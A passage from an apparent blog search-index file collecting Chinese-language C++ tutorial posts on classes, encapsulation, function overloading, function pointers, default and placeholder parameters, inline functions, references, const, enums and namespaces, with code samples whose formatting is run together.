Circle::getArea() &#123; m_area = 3.14 * m_R * m_R; return m_area;&#125;double Circle::getGirth() &#123; m_girth = 2 * 3.14 * m_R; return m_girth;&#125;double Circle::getR() &#123; return m_R;&#125;void Circle::setR(double r)&#123; m_R = r;&#125; main.cpp 使用Circle类需要引用类头文件#include&quot;Circle.h&quot; 1234567891011121314#include&lt;iostream&gt;#include\"Circle.h\"using namespace std;int main(int argc, char* argv[])&#123; Circle c; c.setR(10.0); cout &lt;&lt; c.getArea() &lt;&lt; endl; cout &lt;&lt; c.getGirth() &lt;&lt; endl; cout &lt;&lt; c.getR() &lt;&lt; endl; return 0;&#125;","categories":[{"name":"c++","slug":"c","permalink":"https://xiaowuyoucy.github.io/categories/c/"}],"tags":[]},{"title":"类的封装","slug":"cpp0017-类的封装","date":"2021-04-24T20:24:57.000Z","updated":"2021-04-24T20:37:46.221Z","comments":true,"path":"2021/04/25/cpp0017-类的封装/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/04/25/cpp0017-类的封装/","excerpt":"","text":"类的封装 面向对象有三大特点， 封装，继承，多态 C++将struct 做了功能的增强，struct实际上就是一个class 只不过struct的类的内部，默认的访问控制权限是public class 的类的内部，默认的访问控制权限是private 输入年月日,并判断是否是闰年 封装前 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960#define _CRT_SECURE_NO_WARNINGS #include &lt;iostream&gt;using namespace std;struct Date&#123; int year; int month; int day;&#125;;//初始化这个结构体void init(struct Date &amp; date)&#123; cout &lt;&lt; \"year, month, day\" &lt;&lt; endl; cin &gt;&gt; date.year; cin &gt;&gt; date.month; cin &gt;&gt; date.day;&#125;//打印此结构体void printDate(struct Date &amp;date)&#123; cout &lt;&lt; \"日期是\" &lt;&lt; date.year &lt;&lt; \"年\" &lt;&lt; date.month &lt;&lt; \"月\" &lt;&lt; date.day &lt;&lt; \"日\" &lt;&lt; endl;&#125;//判断是否为闰年bool isLeapYear(struct Date &amp;date)&#123; if (((date.year % 4 == 0) &amp;&amp; (date.year % 100 != 0)) || (date.year % 400 == 0)) &#123; return true; &#125; else &#123; return false; &#125;&#125;void test1()&#123; struct Date date; //传统的C语言开发，面向过程的， 是一个一个函数来操作， C语种最小单元是一个函数 init(date); printDate(date); if (isLeapYear(date) == true) &#123; cout &lt;&lt; \"是闰年\" &lt;&lt; endl; &#125; else &#123; cout &lt;&lt; \"不是闰年\" &lt;&lt; endl; &#125;&#125;int main()&#123; test1(); return 0;&#125; 封装后 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576#define _CRT_SECURE_NO_WARNINGS #include &lt;iostream&gt;using namespace std;class MyDate&#123; //类的&#123;&#125;中的所有区域称为 类的 内部， 除了&#123;&#125;区域以外都是 类的外部public://访问控制权限 //在public标识符下面定义的成员变量和成员函数 均可以在类的外部和类的内部 访问 int getYear() &#123; return year; &#125; void init() &#123; cout &lt;&lt; \"year, month, day\" &lt;&lt; endl; cin &gt;&gt; year; cin &gt;&gt; month; cin &gt;&gt; day; &#125; //成员函数 bool isLeapYear() &#123; if (((year % 4 == 0) &amp;&amp; (year % 100 != 0)) || (year % 400 == 0)) &#123; return true; &#125; else &#123; return false; &#125; &#125; void printDate() &#123; cout &lt;&lt; \"日期是\" &lt;&lt; year &lt;&lt; \"年\" &lt;&lt; month &lt;&lt; \"月\" &lt;&lt; day &lt;&lt; \"日\" &lt;&lt; endl; &#125;protected://如果是单个类， 跟private是一样的。 在类的内部能够访问，在类的外部不能够访问private://在private 访问控制符 下定义的成员变量和成员函数 只能在类的内部访问 int month; int day; int year;&#125;;void test2()&#123; MyDate date; //通过MyDate 类 实例化一个对象 //c++中 是面向对象进行开发，所有方法都封装在类中， 通过一个一个的对象进行编程。 date.init(); if (date.isLeapYear() == true) &#123; cout &lt;&lt; \"是闰年\" &lt;&lt; endl; &#125; else &#123; cout &lt;&lt; \"不是闰年\" &lt;&lt; endl; &#125; //cout &lt;&lt;\"年\"&lt;&lt; date.year &lt;&lt; endl; cout &lt;&lt; \"年\" &lt;&lt; date.getYear() &lt;&lt; endl; /* date.year = 2005;//在类的外部修改了成员变量 date.month; date.day; */&#125;int main(void)&#123; //test1(); test2(); return 0;&#125;","categories":[{"name":"c++","slug":"c","permalink":"https://xiaowuyoucy.github.io/categories/c/"}],"tags":[]},{"title":"类的基本概念","slug":"cpp0016-类的基本概念","date":"2021-04-24T20:01:19.000Z","updated":"2021-04-24T20:27:25.793Z","comments":true,"path":"2021/04/25/cpp0016-类的基本概念/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/04/25/cpp0016-类的基本概念/","excerpt":"","text":"类的基本概念 类的定义 123class className&#123;类成员变量或方法&#125;; 类方法可以直接调用类成员变量或方法 12345678910111213141516171819202122232425262728293031323334353637383940414243444546#include&lt;iostream&gt;using namespace std;class Animal &#123;public: char name[64]; char color[64]; void run() &#123; cout &lt;&lt; name &lt;&lt; \"跑起来了\" &lt;&lt; endl; &#125; void write() &#123; cout &lt;&lt; name &lt;&lt; \"写字了\" &lt;&lt; endl; &#125; void print() &#123; cout &lt;&lt; name &lt;&lt; endl; cout &lt;&lt; color &lt;&lt; endl; &#125;private: int id;&#125;;int main(int argc, char* argv[])&#123; Animal dog, cat; strcpy(dog.color, \"yellow\"); strcpy(dog.name, \"xiaoming\"); strcpy(cat.name, \"xiaohua\"); strcpy(cat.color, \"black\"); dog.print(); cat.print(); dog.run(); dog.write(); cat.run(); cat.write(); return 0;&#125; public 公有的,类的外部可以直接调用 private私有的,类的外部不可以直接调用,可以通过方法get或set protected保护的,在类的外部调用不到,子类可以调用","categories":[{"name":"c++","slug":"c","permalink":"https://xiaowuyoucy.github.io/categories/c/"}],"tags":[]},{"title":"函数重载","slug":"cpp0014-函数重载","date":"2021-04-22T16:12:36.000Z","updated":"2021-04-22T16:38:09.512Z","comments":true,"path":"2021/04/23/cpp0014-函数重载/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/04/23/cpp0014-函数重载/","excerpt":"","text":"函数重载 函数重载(Function Overload)：用同一个函数名定义不同的函数，当函 数名和不同的参数搭配时函数的含义不同。 重载规则 1,函数名相同。 2,参数个数不同,参数的类型不同,参数顺序不同,均可构成重载。 3,返回值类型不影响重载。 调用准则 1,严格匹配,找到则调用。 2,通过隐式转换寻求一个匹配,找到则调用。 编译器调用重载函数的准则: 1.将所有同名函数作为候选者 2.尝试寻找可行的候选函数 3.精确匹配实参 4.通过默认参数能够匹配实参 5.通过默认类型转换匹配实参 6.匹配失败 7.最终寻找到的可行候选函数不唯一，则出现二义性，编译失败。 8.无法匹配所有候选者，函数未定义，编译失败。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109#define _CRT_SECURE_NO_WARNINGS #include &lt;iostream&gt;using namespace std;//决定一个函数的 1 返回值， 2 参数列表void func(int a)//void (*fp)(int)&#123; cout &lt;&lt; \"func1 \" &lt;&lt; endl; cout &lt;&lt; a &lt;&lt; endl;&#125;//函数重载 是对一种函数的 添加的 意义， 对一个函数名 添加多中不同的实现 （+）//函数重载， 就是对参数列表的 变换不是 函数返回值的变化//返回值必须一样，参数列表不同， 并且函数名 相同的函数 都是重载函数//void func(int a, int b = 10)void func(int a, int b )&#123; cout &lt;&lt; \"func2\" &lt;&lt; endl; cout &lt;&lt; a &lt;&lt; \",\" &lt;&lt;b &lt;&lt; endl;&#125;//如果函数 完全相同 也不是一个函数重载/*void func(int a, int b)&#123;&#125;*/void func(int a, int b, char *str)&#123; cout &lt;&lt; \"func3\" &lt;&lt; endl; cout &lt;&lt; a &lt;&lt; \", \" &lt;&lt; b &lt;&lt; \", \" &lt;&lt; str &lt;&lt; endl;&#125;//返回值类型不同，不能构成重载/*char func()&#123;&#125;*/void print(double a)&#123; cout &lt;&lt; \"print double \" &lt;&lt; endl; cout &lt;&lt; a &lt;&lt; endl;&#125;void print(float a)&#123; cout &lt;&lt;\"print float\" &lt;&lt;endl; cout &lt;&lt;a &lt;&lt;endl;&#125;#if 0void print(int a)&#123; cout &lt;&lt; \"print int\" &lt;&lt; endl; cout &lt;&lt; a &lt;&lt; endl;&#125;void print(char a)&#123; cout &lt;&lt; \"print char\" &lt;&lt; endl; cout &lt;&lt; a &lt;&lt; endl;&#125;#endifint main(void)&#123; //定义一个 指向void func(int a)的函数指针 //void(*fp)(int) = func;//fp 就是执行 void()(int) 这种函数类型的指针 //fp(10); func(10); //编译器 会根据用户传递的参数类型和个数 进行重载函数的匹配 //如果说函数重载 加上了默认参数， 回导致调用函数的时候出现二义性， //记住： 函数重载 最好不要有默认参数， func(10, 20); func(10, 20, \"abc\"); //print(10); //void print(int a) //print(1.1);//void print(double a) //print(1.1f); // 经过隐式转换 会调用void print(double a) //print('a'); //经过隐式转化， 'a' -&gt;int void print(int a) //print(\"asbdasd\"); //1 严格进行参数列表匹配 //2 如果隐式转换可以找到匹配 那么依然可以调用 //3 如果匹配不到， 直接报错。 return 0;&#125; 重载底层实现（name mangling） C++利用 name mangling(倾轧)技术,来改名函数名,区分参数不同的同 名函数。 实现原理:用 v c i f l d表示 void char int float long double 及其引 用。 12void func(char a); // func_c(char a)void func(char a,int b,double c); //func_cid(char a,int b,double c);","categories":[{"name":"c++","slug":"c","permalink":"https://xiaowuyoucy.github.io/categories/c/"}],"tags":[]},{"title":"函数重载和函数指针","slug":"cpp0015-函数重载和函数指针","date":"2021-04-22T16:12:36.000Z","updated":"2021-04-22T17:49:33.840Z","comments":true,"path":"2021/04/23/cpp0015-函数重载和函数指针/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/04/23/cpp0015-函数重载和函数指针/","excerpt":"","text":"函数重载和函数指针 函数重载与函数指针 当使⽤用重载函数名对函数指针进⾏行赋值时 根据重载规则挑选与函数指针参数列表⼀一致的候选者 严格匹配候选者的函数类型与函数指针的函数类型 函数指针，调用的时候是不能够发生函数重载的 函数指针基本语法 123456789101112int func(int a, int b,int c)&#123; cout &lt;&lt; \"func2\" &lt;&lt; endl; return 0;&#125;//第一种函数指针定义typedef int (My_func)(int, int);//第二种函数指针定义typedef int(*My_func2)(int, int);//第三种函数指针定义int(*fp3)(int, int) = func; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667#define _CRT_SECURE_NO_WARNINGS #include &lt;iostream&gt;using namespace std;void func(int a, int b)&#123; cout &lt;&lt; a &lt;&lt; b &lt;&lt; endl;&#125;void func(int a, int b, int c)&#123; cout &lt;&lt; a &lt;&lt; b &lt;&lt; c &lt;&lt; endl;&#125;void func(int a, int b, int c, int d)&#123; cout &lt;&lt; a &lt;&lt; b &lt;&lt; c &lt;&lt;d &lt;&lt; endl;&#125;//1 定义一个函数类型typedef void(myfunctype)(int, int); //定义了一个函数类型， 返回值void 参数列表是 int，int ,, void()(int,int)//2 定义一个函数指针类型 typedef void(*myfunctype_pointer)(int, int); //定义了一个函数指针类型， 返回值void 参数列表是 int，int ,, void(*)(int,int)int main(void)&#123; //1 定义一个函数指针 myfunctype * fp1 = NULL; fp1 = func; fp1(10, 20); // 2 定义一个函数指针 myfunctype_pointer fp2 = NULL; fp2 = func; fp2(10, 20); //3 直接定义一个函数指针 void(*fp3)(int, int) = NULL; fp3 = func; fp3(10, 20); cout &lt;&lt; \" -----------------\" &lt;&lt; endl; //此时的fp3 是 void(*)(int,int) //fp3(10, 30, 30); //fp3 恒定指向一个 函数入口，void func(int, int) 的函数入口 //fp3(10, 30, 40, 50); //想要通过函数指针，发生函数重载 是不可能。 fp3(10, 20); void(*fp4)(int, int, int) = func; //在堆函数指针赋值的时候，函数指针会根据自己的类型 找到一个重载函数 fp4(10, 10, 10); //fp4(10, 10, 10, 10); //函数指针，调用的时候是不能够发生函数重载的。 void(*fp5)(int, int, int, int) = func;// void func(int ,int ,int ,int ) fp5(10, 10, 10, 10); return 0;&#125;","categories":[{"name":"c++","slug":"c","permalink":"https://xiaowuyoucy.github.io/categories/c/"}],"tags":[]},{"title":"函数的默认参数和占位参数","slug":"cpp0013-函数的默认参数和占位参数","date":"2021-04-22T15:48:32.000Z","updated":"2021-04-22T16:12:03.183Z","comments":true,"path":"2021/04/22/cpp0013-函数的默认参数和占位参数/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/04/22/cpp0013-函数的默认参数和占位参数/","excerpt":"","text":"函数的默认参数和占位参数 默认参数规则 只有参数列表后面部分的参数才可以提供默认参数值 一旦在一个函数调用中开始使用默认参数值，那么这个参数后的所有参 数都必须使用默认参数值 123456789101112131415161718192021#include&lt;iostream&gt;using namespace std;int qiuLiFangTiTiJi(int l = 10, int w = 20, int h = 10)&#123; return l * w * h;&#125;int main(int argc, char* argv[])&#123; int l = 10; int w = 20; int h = 30; cout &lt;&lt; qiuLiFangTiTiJi() &lt;&lt; endl; cout &lt;&lt; qiuLiFangTiTiJi(l) &lt;&lt; endl; cout &lt;&lt; qiuLiFangTiTiJi(l, w) &lt;&lt; endl; cout &lt;&lt; qiuLiFangTiTiJi(l, w, h) &lt;&lt; endl; return 0;&#125; 占位参数 函数占位参数 占位参数只有参数类型声明，⽽而没有参数名声明 一般情况下，在函数体内部⽆无法使⽤用占位参数 12345678910111213141516171819#include&lt;iostream&gt;using namespace std;int max(int a, int b, int)&#123; return a &gt; b ? a : b;&#125;int max2(int a, int b, float = 0)&#123; return a &gt; b ? a : b;&#125;int main(int argc, char* argv[])&#123; cout &lt;&lt; max(10, 20, 30) &lt;&lt; endl; cout &lt;&lt; max2(410,330) &lt;&lt; endl; return 0;&#125;","categories":[{"name":"c++","slug":"c","permalink":"https://xiaowuyoucy.github.io/categories/c/"}],"tags":[]},{"title":"内联函数","slug":"cpp0012-内联函数","date":"2021-04-22T15:30:23.000Z","updated":"2021-04-22T15:47:32.185Z","comments":true,"path":"2021/04/22/cpp0012-内联函数/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/04/22/cpp0012-内联函数/","excerpt":"","text":"内联函数 c 语言中有宏函数的概念。宏函数的特点是内嵌到调用代码中去,避免了 函数调用 的开销。但是由于宏函数的处理发生在预处理阶段,缺失了语法检测 和有可能带来的语意差错 特点： 1）内联函数声明时inline关键字必须和函数定义结合在一起，否则编译器会直 接忽略内联请求。 2）C编译器直接将函数体插入在函数调用的地方 。 3）内联函数没有普通函数调用时的额外开销(压栈，跳转，返回)。 4）内联函数是一种特殊的函数，具有普通函数的特征（参数检查，返回类型 等）。 5） 内联函数由 编译器处理，直接将编译后的函数体插入调用的地方， 宏代码片段 由预处理器处理， 进行简单的文本替换，没有任何编译过程。 6）C中内联编译的限制： 不能存在任何形式的循环语句 不能存在过多的条件判断语句 函数体不能过于庞大 不能对函数进行取址操作 函数内联声明必须在调用语句之前 7）编译器对于内联函数的限制并不是绝对的，内联函数相对于普通函数的优 势只是省去了函数调用时压栈，跳转和返回的开销。因此，当函数体的执行开 销远大于压栈，跳转和返回所用的开销时，那么内联将无意义。 12345678910111213141516171819#include&lt;iostream&gt;using namespace std;//内联函数inline int Max(int a, int b)&#123; return a &gt; b ? a : b;&#125;int main(int argc, char* argv[])&#123; int a = 100; int b = 20; int max = Max(a, b); cout &lt;&lt; max &lt;&lt; endl; return 0;&#125;","categories":[{"name":"c++","slug":"c","permalink":"https://xiaowuyoucy.github.io/categories/c/"}],"tags":[]},{"title":"const引用","slug":"cpp0011-const引用","date":"2021-04-22T15:26:26.000Z","updated":"2021-04-26T15:48:11.367Z","comments":true,"path":"2021/04/22/cpp0011-const引用/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/04/22/cpp0011-const引用/","excerpt":"","text":"const引用 1234567891011121314151617181920212223242526272829303132333435363738394041#define _CRT_SECURE_NO_WARNINGS #include &lt;iostream&gt;using namespace std;//const引用一般用在形参上，来限制 被引用的变量不能被修改，void printX(const int &amp; re )&#123; cout &lt;&lt; \"re \" &lt;&lt; re &lt;&lt; endl;&#125;int main(void)&#123; const int a = 10; // a必须初始化 //int &amp; b = a; const int &amp;b = a; //如果是一个const 常量， 必须用const 引用来接收它 int x = 3.14; const int &amp;re1 = x; cout &lt;&lt; \"re1 \" &lt;&lt; re1 &lt;&lt; endl; x = 20; cout &lt;&lt; \"re1 \" &lt;&lt; re1 &lt;&lt; \", x: \" &lt;&lt; x &lt;&lt; endl; const int &amp;re2 = 10;// 用const 引用 引用一个字面量 // 当用一个const 引用 去引用一个字面量的时候， 字面量他是没有地址， //引用是无法 对字面量取地址的， 临时创建一个 int temp， 10 ---&gt;temp //const int &amp;re2 = temp; //用re2 就是代表 temp，re2是const的引用，你无法去改变temp的值 //int &amp;re2 = 10; //非常量引用 必须是左值。 左值就是可以放在=左边的表达式，左值是可以赋值，是有内存空间的 //如果想对一个字面量做引用的话，只能用 const 的引用 cout &lt;&lt; \"re2 = \" &lt;&lt; re2 &lt;&lt; endl; cout &lt;&lt; \"sizeof(re2)\" &lt;&lt; sizeof(re2) &lt;&lt; endl; return 0;&#125;","categories":[{"name":"c++","slug":"c","permalink":"https://xiaowuyoucy.github.io/categories/c/"}],"tags":[]},{"title":"指针引用","slug":"cpp0010-指针引用","date":"2021-04-22T15:15:14.000Z","updated":"2021-04-22T15:19:03.507Z","comments":true,"path":"2021/04/22/cpp0010-指针引用/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/04/22/cpp0010-指针引用/","excerpt":"","text":"指针引用 123456789101112131415161718192021222324252627282930313233343536373839404142#include&lt;iostream&gt;#include&lt;cstdlib&gt;using namespace std;int my_malloc(int num,int **pp)&#123; *pp = (int *)malloc(num); return 0;&#125;//指针引用做函数参数,优化二级指针int my_malloc2(int num, int * &amp;pp)//pp 代表 *pp&#123; pp = (int *)malloc(num); return 0;&#125;int main(int argc, char* argv[])&#123; int *p = NULL; my_malloc(100, &amp;p); cout &lt;&lt; p &lt;&lt; endl; free(p); p = NULL; cout &lt;&lt; \"------------------------------------\" &lt;&lt; endl; my_malloc2(4, p); *p = 4; cout &lt;&lt; *p &lt;&lt; endl; free(p); p = NULL; return 0;&#125;","categories":[{"name":"c++","slug":"c","permalink":"https://xiaowuyoucy.github.io/categories/c/"}],"tags":[]},{"title":"引用的本质","slug":"cpp0009-引用的本质","date":"2021-04-22T14:28:42.000Z","updated":"2021-04-22T14:32:32.798Z","comments":true,"path":"2021/04/22/cpp0009-引用的本质/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/04/22/cpp0009-引用的本质/","excerpt":"","text":"引用的本质 在研究引用的时候 ，可以将引用理解为 一个 常指针 在理解引用的时候， 可以将引用理解为 一个变量的别名 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119#define _CRT_SECURE_NO_WARNINGS #include &lt;iostream&gt;using namespace std;struct TypeA&#123; int *a;&#125;;struct TypeB&#123; double &amp;a;&#125;;struct Teacher&#123; int id; char name[64];&#125;;void motifyTeacher(Teacher &amp;t) //&#123; t.id = 100; // 如果说t是一个常指针， *t 就是指针指向内存空间 (*t).id = 100 //当你要试图修改或者获取已经初始化的引用的时候， 编译器会有一个隐藏的*的操作&#125;void motifyA(int *const a) //常指针 也是一个常量， 也是必须要初始化， 也不能被修改&#123; *a = 100;&#125;void motifyB(int &amp;a)&#123; a = 1000; //a 实际上是一个常量指针， 但是如果你给一个a赋值，编译器会有一个隐形的操作， *&#125;//在研究引用的时候 ，可以将引用理解为 一个 常指针//在理解引用的时候， 可以将引用理解为 一个变量的别名void test()&#123; int value = 20; Teacher t1 = &#123; 1, \"zhangsan\" &#125;; motifyA(&amp;value); cout &lt;&lt; \"value = \" &lt;&lt; value &lt;&lt; endl; motifyB(value); // int value --&gt; int &amp;a , int&amp; a = value 给引用指定指向哪个变量的时候， 编译器提供又有了一个隐形的操作 // a = &amp;value; cout &lt;&lt; \"value = \" &lt;&lt; value &lt;&lt; endl; motifyTeacher(t1); //如果说 motifyTeacher 的形参是一个常指针，Teacher *const t = &amp;t1; //编译器发现 Teacher &amp;t 形参是一个引用， Teacher &amp;t = &amp;t1; //当给引用初始化的时候， 会有一个&amp; 的隐形操作&#125;void motifyAA(int *a)&#123; *a = 100; //间接的赋值&#125;void motifyBB(int &amp;a) //int &amp;a = a; a = &amp;a;&#123; a = 200; //*a = 200&#125;void test2()&#123; int a = 10; //条件一 motifyAA(&amp;a); //int*a = &amp;a; //建立了关联 motifyBB(a);&#125;int main(void)&#123; int a = 10; int b = 20; const int c_a = 10; //c_a = 20;//常量在初始化之后，不能够再修改了 int &amp;re = a; //引用必须初始化. 引用在初始化之后，也不能够被改变 re = b; // a = b 而不是 让re引用指向b cout &lt;&lt; \"re = \" &lt;&lt; re &lt;&lt; endl; cout &lt;&lt; \"a = \" &lt;&lt; a &lt;&lt; endl; cout &lt;&lt; \"b = \" &lt;&lt; b &lt;&lt; endl; re = 100; //是该的a 还是b？ cout &lt;&lt; \"re = \" &lt;&lt; re &lt;&lt; endl; cout &lt;&lt; \"a = \" &lt;&lt; a &lt;&lt; endl; cout &lt;&lt; \"b = \" &lt;&lt; b &lt;&lt; endl; //1 引用 可能是一个 常量？ cout &lt;&lt; \"sizeof(TypeA): \" &lt;&lt; sizeof(TypeA) &lt;&lt; endl; cout &lt;&lt; \"sizeof(TypeB):\" &lt;&lt; sizeof(TypeB) &lt;&lt; endl; //通过对引用求大小， 发现不管引用是什么类型 都是4个字节，都跟指针的大小一样。 //2 引用可能是一个 指针？ test(); return 0;&#125;","categories":[{"name":"c++","slug":"c","permalink":"https://xiaowuyoucy.github.io/categories/c/"}],"tags":[]},{"title":"引用的基本概念","slug":"cpp0008-引用的基本概念","date":"2021-04-22T13:35:32.000Z","updated":"2021-04-22T19:44:07.552Z","comments":true,"path":"2021/04/22/cpp0008-引用的基本概念/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/04/22/cpp0008-引用的基本概念/","excerpt":"","text":"引用的基本概念 给变量起别名 规则 1 引用没有定义,是一种关系型声明。声明它和原有某一变量(实体)的关 系。故 而类型与原类型保持一致,且不分配内存。与被引用的变量有相同的地 址。 123456789101112131415#include&lt;iostream&gt;using namespace std;int main(int argc, char* argv[])&#123; int a = 100; int &amp; re = a; cout &lt;&lt; \"&amp;a = \" &lt;&lt; &amp;a &lt;&lt; endl; cout &lt;&lt; \"&amp;re = \" &lt;&lt; &amp;re &lt;&lt; endl; return 0;&#125; 2 声明的时候必须初始化,一经声明,不可变更。 12345678910111213#include&lt;iostream&gt;using namespace std;int main(int argc, char* argv[])&#123; int a = 100; //int &amp;re; //Error int &amp;re = a; cout &lt;&lt; re &lt;&lt; endl; return 0;&#125; 3 可对引用,再次引用。多次引用的结果,是某一变量具有多个别名。 123456789101112131415161718#include&lt;iostream&gt;using namespace std;int main(int argc, char* argv[])&#123; int a = 100; //int &amp;re; //Error int &amp;re = a; int &amp;re2 = re; cout &lt;&lt; re &lt;&lt; endl; cout &lt;&lt; re2 &lt;&lt; endl; cout &lt;&lt; &amp;a &lt;&lt; endl; cout &lt;&lt; &amp;re &lt;&lt; endl; cout &lt;&lt; &amp;re2 &lt;&lt; endl; return 0;&#125; 4 &amp;符号前有数据类型时,是引用。其它皆为取地址。 引用做函数参数或函数返回值 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647#include&lt;iostream&gt;using namespace std;typedef struct student&#123; char name[50]; float score; int sex;&#125;Student;//交换两个变量的值int my_swap(int &amp;a, int &amp;b)&#123; int tem = a; a = b; b = tem; return 0;&#125;//打印结构体变量Student &amp; my_print(Student &amp;a)&#123; cout &lt;&lt; a.name &lt;&lt; endl; cout &lt;&lt; a.score &lt;&lt; endl; cout &lt;&lt; a.sex &lt;&lt; endl; return a;&#125;int main(int argc, char* argv[])&#123; Student XiaoMing = &#123; \"XiaoMing\",100.0f,1 &#125;; int a = 100, b = 90; cout &lt;&lt; \"a = \" &lt;&lt; a &lt;&lt; endl; cout &lt;&lt; \"b = \" &lt;&lt; b &lt;&lt; endl; cout &lt;&lt; \"--------------------------------\" &lt;&lt; endl; my_swap(a, b); my_print(XiaoMing); cout &lt;&lt; \"--------------------------------\" &lt;&lt; endl; cout &lt;&lt; \"a = \" &lt;&lt; a &lt;&lt; endl; cout &lt;&lt; \"b = \" &lt;&lt; b &lt;&lt; endl; return 0;&#125;","categories":[{"name":"c++","slug":"c","permalink":"https://xiaowuyoucy.github.io/categories/c/"}],"tags":[]},{"title":"枚举的增强","slug":"cpp0007-枚举的增强","date":"2021-04-15T15:10:03.000Z","updated":"2021-04-15T15:11:30.054Z","comments":true,"path":"2021/04/15/cpp0007-枚举的增强/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/04/15/cpp0007-枚举的增强/","excerpt":"","text":"枚举的增强 1234567891011121314151617181920212223#include&lt;iostream&gt;using namespace std;enum Son &#123; xiaom, xiaoh, xiaol, xiaolan,&#125;;int main(int argc, char* argv[])&#123; //可以省略enum关键字不写 Son house = xiaom; //c++中,枚举变量只能用枚举常量来赋值 //house = 1; cout &lt;&lt; house &lt;&lt; endl; cin.get(); return 0;&#125;","categories":[{"name":"c++","slug":"c","permalink":"https://xiaowuyoucy.github.io/categories/c/"}],"tags":[]},{"title":"const的增强","slug":"cpp0006-const的增强","date":"2021-04-15T14:19:28.000Z","updated":"2021-04-26T15:48:41.832Z","comments":true,"path":"2021/04/15/cpp0006-const的增强/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/04/15/cpp0006-const的增强/","excerpt":"","text":"const的增强 const int * a表示指针指向的内存空间不可以修改 int * const a表示不能修改a的指向 const int * const a 表示a的内存和a所指向的内存都不可以修改 1234567891011121314151617181920212223#include&lt;iostream&gt;using namespace std;int main(int argc, char* argv[])&#123; //在c语言中a是一个假常量,c++中a是一个真的常量,只不过在编译阶段完成,而不是预处理阶段 const int a = 100; //创建一个临时变量的地址赋值给p1,所以修改*p1时,a不会改变 int * p1 = (int *)&amp;a; //c++中const修饰过的整型变量可以声明数组,c语言不可以 int array[a] = &#123; 0 &#125;; *p1 = 1; cout &lt;&lt; \"a = \" &lt;&lt; a &lt;&lt; endl; cout &lt;&lt; \"*p1 = \" &lt;&lt; *p1 &lt;&lt; endl; return 0;&#125;","categories":[{"name":"c++","slug":"c","permalink":"https://xiaowuyoucy.github.io/categories/c/"}],"tags":[]},{"title":"三目运算符的加强","slug":"cpp0005-三目运算符的加强","date":"2021-04-14T17:53:25.000Z","updated":"2021-04-15T14:18:49.107Z","comments":true,"path":"2021/04/15/cpp0005-三目运算符的加强/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/04/15/cpp0005-三目运算符的加强/","excerpt":"","text":"三目运算符的加强 1234567891011121314151617181920#include&lt;iostream&gt;using namespace std;int main(int argc, char* argv[])&#123; int a, b; a = 10; b = 20; //三目运算符可以用作左值,返回的是a或b的引用 //c语言则不行,除非这样写(a &gt; b ? &amp;a : &amp;b) = 100; (a &gt; b ? a : b) = 100; cout &lt;&lt; \"a = \" &lt;&lt; a &lt;&lt; endl; cout &lt;&lt; \"b = \" &lt;&lt; b &lt;&lt; endl; cin.get(); return 0;&#125;","categories":[{"name":"c++","slug":"c","permalink":"https://xiaowuyoucy.github.io/categories/c/"}],"tags":[]},{"title":"C++语言对C的增强和bool","slug":"cpp0004-C-语言对C的增强和bool","date":"2021-04-14T17:53:25.000Z","updated":"2021-04-14T18:31:06.706Z","comments":true,"path":"2021/04/15/cpp0004-C-语言对C的增强和bool/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/04/15/cpp0004-C-语言对C的增强和bool/","excerpt":"","text":"C++语言对C的增强和bool 变量定义 c语言:早期版本中规定要定义在函数首部 c++:在函数内随便一个位置都可以 c对定义全局变量的检测能力增强了,c语言在同一个地方可以定义多次重名的全局变量,c不可以. 123456789101112131415161718192021#include&lt;stdio.h&gt;int g_a;int g_a = 2;/*c语言会处理成:int g_a;g_a = 2;*/int main(int argc, char* argv[])&#123; return 0;&#125; struct的类型增强 C++定义struct变量时可以不用加struct关键字 1234567891011121314#include&lt;iostream&gt;using namespace std;struct student &#123; float score;&#125;;int main(int argc, char* argv[])&#123; //可以不用加struct关键字 student xiaoming; return 0;&#125; C++不可以没有函数类型,c语言可以没有函数类型,默认是int C++填写函数参数必须是对应个数,C语言可以不对应 12345678910111213141516171819#include&lt;stdio.h&gt;//c语言可以没有函数类型,默认为intfun()&#123; return 0;&#125;fun1(int a) &#123; return 0;&#125;int main(int argc, char* argv[])&#123; //传入过多的参数,c语言也不会出错 fun1(1,2,3,4,5,61,2); return 0;&#125; C++引入了bool类型来表示true和false 1234567891011121314#include&lt;iostream&gt;using namespace std;int main(int argc, char* argv[])&#123; bool flag = true; cout &lt;&lt; (bool)flag &lt;&lt; endl; cout &lt;&lt; sizeof(flag) &lt;&lt; endl; cout &lt;&lt; (flag = 100) &lt;&lt; endl; cout &lt;&lt; (flag = 0) &lt;&lt; endl; return 0;&#125;","categories":[{"name":"c++","slug":"c","permalink":"https://xiaowuyoucy.github.io/categories/c/"}],"tags":[]},{"title":"自定义命名空间","slug":"cpp0003-自定义命名空间","date":"2021-04-14T17:37:03.000Z","updated":"2021-04-14T18:29:54.500Z","comments":true,"path":"2021/04/15/cpp0003-自定义命名空间/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/04/15/cpp0003-自定义命名空间/","excerpt":"","text":"自定义命名空间 12345678910/*语法:namespace 自定义命名空间名&#123;内容&#125;*/ 123456789101112131415161718192021222324252627282930313233343536373839404142434445#include&lt;iostream&gt;using namespace std;namespace xiaochenyanA &#123; int a;&#125;namespace xiaochenyanB &#123; int a; //可以嵌套定义命名空间 namespace xiaochenyanC &#123; typedef struct student &#123; float score; &#125;student_t; 